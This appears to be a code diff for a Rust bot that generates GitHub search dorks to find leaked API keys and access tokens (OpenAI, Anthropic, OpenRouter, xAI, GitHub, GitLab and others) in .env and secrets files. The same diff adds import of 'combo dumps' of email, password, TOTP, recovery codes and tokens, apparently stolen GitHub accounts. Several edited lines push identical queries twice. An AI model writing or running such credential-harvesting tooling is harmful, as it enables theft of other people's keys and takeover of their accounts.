@@ -2308,6 +2308,13 @@ async fn handle_auto(app: &Arc<App>, chat: i64, args: &str) -> Result<()> {
 async fn add_pats(app: Arc<App>, chat: i64, raw: String) {
     let parsed = crate::pat::parse_input(&raw);
     let tokens = parsed.entries;
+    // combo-дампы (email:pass:totp:recovery:user:token) — аккаунты учитываем отдельно
+    let mut accounts = 0usize;
+    for combo in &parsed.combos {
+        if let Ok(true) = app.store.add_gh_account(combo) {
+            accounts += 1;
+        }
+    }
     if tokens.is_empty() {
         let hint = if parsed.skipped.is_empty() {
             "".to_string()
@@ -2377,8 +2384,8 @@ async fn add_pats(app: Arc<App>, chat: i64, raw: String) {
     let _ = app.pool.reload();
     app.sync_source_pats();
     let mut text = format!(
-        "🗂 <b>PAT загружены</b>\n\n✅ принято: <b>{}</b> из {}\n\n",
-        ok, total
+        "🗂 <b>PAT загружены</b>\n\n✅ принято: <b>{}</b> из {}\n👤 combo-аккаунтов: <b>{}</b>\n\n",
+        ok, total, accounts
     );
     for line in lines.iter().take(30) {
         text.push_str(line);
@@ -2720,19 +2727,19 @@ fn manual_queries_from(raw: &str, dork_limit: usize, offset: usize) -> Vec<Strin
         } else {
             out.push(format!("\"{host}\" \"sk-\" in:file"));
         }
-        out.push(format!("\"{var}\" filename:.env"));
-        out.push(format!("\"{var}\" extension:env"));
+        out.push(format!("\"{var}\" path:.env"));
+        out.push(format!("\"{var}\" path:.env"));
     }
 
     if low.contains("modelscope") {
         out.push("\"api-inference.modelscope.cn\" \"ms-\" in:file".into());
         out.push("\"modelscope.cn\" \"ms-\" in:file".into());
-        out.push("\"MODELSCOPE_API_KEY\" filename:.env".into());
+        out.push("\"MODELSCOPE_API_KEY\" path:.env".into());
     }
 
     if !has_ext {
-        out.push(format!("{q} extension:env"));
-        out.push(format!("{q} filename:.env"));
+        out.push(format!("{q} path:.env"));
+        out.push(format!("{q} path:.env"));
     }
     if !has_scope {
         out.push(format!("{q} in:file"));
@@ -2744,7 +2751,7 @@ fn manual_queries_from(raw: &str, dork_limit: usize, offset: usize) -> Vec<Strin
             .format("%Y-%m-%d")
             .to_string();
         out.push(format!("{q} pushed:>{cutoff}"));
-        out.push(format!("{q} pushed:>{cutoff} extension:env"));
+        out.push(format!("{q} pushed:>{cutoff} path:.env"));
     }
 
     // Literal key-shape dorks are provider-scoped. A DashScope target must
@@ -2768,11 +2775,11 @@ fn manual_queries_from(raw: &str, dork_limit: usize, offset: usize) -> Vec<Strin
         // non-PAT provider shapes.
         shapes.extend(
             [
-                "\"sk-proj-\" extension:env",
-                "\"sk-or-v1-\" extension:env",
-                "\"sk-ant-\" extension:env",
-                "\"xai-\" extension:env",
-                "\"ms-\" extension:env",
+                "\"sk-proj-\" path:.env",
+                "\"sk-or-v1-\" path:.env",
+                "\"sk-ant-\" path:.env",
+                "\"xai-\" path:.env",
+                "\"ms-\" path:.env",
             ]
             .into_iter()
             .map(str::to_string),
@@ -2780,31 +2787,31 @@ fn manual_queries_from(raw: &str, dork_limit: usize, offset: usize) -> Vec<Strin
     } else {
         for name in &provider_names {
             match *name {
-                "openai" => shapes.push("\"sk-proj-\" extension:env".into()),
-                "openrouter" => shapes.push("\"sk-or-v1-\" extension:env".into()),
-                "anthropic" => shapes.push("\"sk-ant-\" extension:env".into()),
-                "xai" => shapes.push("\"xai-\" extension:env".into()),
+                "openai" => shapes.push("\"sk-proj-\" path:.env".into()),
+                "openrouter" => shapes.push("\"sk-or-v1-\" path:.env".into()),
+                "anthropic" => shapes.push("\"sk-ant-\" path:.env".into()),
+                "xai" => shapes.push("\"xai-\" path:.env".into()),
                 "dashscope" | "qwen" | "bailian" => {
-                    shapes.push("\"DASHSCOPE_API_KEY\" extension:env".into());
+                    shapes.push("\"DASHSCOPE_API_KEY\" path:.env".into());
                 }
-                "modelscope" => shapes.push("\"ms-\" extension:env".into()),
+                "modelscope" => shapes.push("\"ms-\" path:.env".into()),
                 "seedance" => {
-                    shapes.push("\"SEEDANCE_API_KEY\" extension:env".into());
-                    shapes.push("\"ARK_API_KEY\" extension:env".into());
+                    shapes.push("\"SEEDANCE_API_KEY\" path:.env".into());
+                    shapes.push("\"ARK_API_KEY\" path:.env".into());
                 }
                 _ => {}
             }
         }
     }
     if wants_pat {
-        shapes.push("\"ghp_\" filename:.env".into());
-        shapes.push("\"github_pat_\" filename:.env".into());
+        shapes.push("\"ghp_\" path:.env".into());
+        shapes.push("\"github_pat_\" path:.env".into());
     }
     if wants_gitlab {
-        shapes.push("\"glpat-\" extension:env".into());
+        shapes.push("\"glpat-\" path:.env".into());
     }
     if wants_gitee {
-        shapes.push("\"gitee_\" extension:env".into());
+        shapes.push("\"gitee_\" path:.env".into());
     }
     for shape in shapes {
         out.push(shape);
@@ -2851,10 +2858,10 @@ fn manual_queries_from(raw: &str, dork_limit: usize, offset: usize) -> Vec<Strin
         "path:kubernetes",
         "path:ansible",
         "path:examples",
-        "filename:.env.local",
-        "filename:.env.production",
-        "filename:.env.development",
-        "filename:.env.staging",
+        "path:.env.local",
+        "path:.env.production",
+        "path:.env.development",
+        "path:.env.staging",
         "filename:secrets.yaml",
         "filename:secrets.yml",
         "filename:credentials",
@@ -3099,8 +3106,8 @@ mod export_tests {
     fn manual_search_expands_the_target_without_losing_it() {
         let qs = manual_queries(r#""OPENROUTER_API_KEY""#, 8);
         assert!(qs.iter().any(|q| q == r#""OPENROUTER_API_KEY""#));
-        assert!(qs.iter().any(|q| q.ends_with(" extension:env")));
-        assert!(qs.iter().any(|q| q.ends_with(" filename:.env")));
+        assert!(qs.iter().any(|q| q.ends_with(" path:.env")));
+        assert!(qs.iter().any(|q| q.ends_with(" path:.env")));
         assert!(qs.iter().any(|q| q.contains("openrouter.ai")));
         assert!(qs.len() <= 8);
         assert_eq!(
@@ -3111,7 +3118,7 @@ mod export_tests {
 
     #[test]
     fn manual_plan_reaches_full_budget() {
-        let qs = manual_queries_from("dashscope extension:env", 80, 0);
+        let qs = manual_queries_from("dashscope path:.env", 80, 0);
         assert!(
             qs.len() >= 70,
             "expected an 80-dork manual plan, got {}: {qs:?}",
@@ -3135,7 +3142,7 @@ mod export_tests {
             assert!(qs.iter().any(|q| q.contains("openrouter.ai")));
             assert!(qs
                 .iter()
-                .any(|q| q.contains("OPENROUTER_API_KEY") && q.ends_with("filename:.env")));
+                .any(|q| q.contains("OPENROUTER_API_KEY") && q.ends_with("path:.env")));
         }
         assert!(manual_source_queries(r#""OPENROUTER_API_KEY""#).len() > 1);
     }
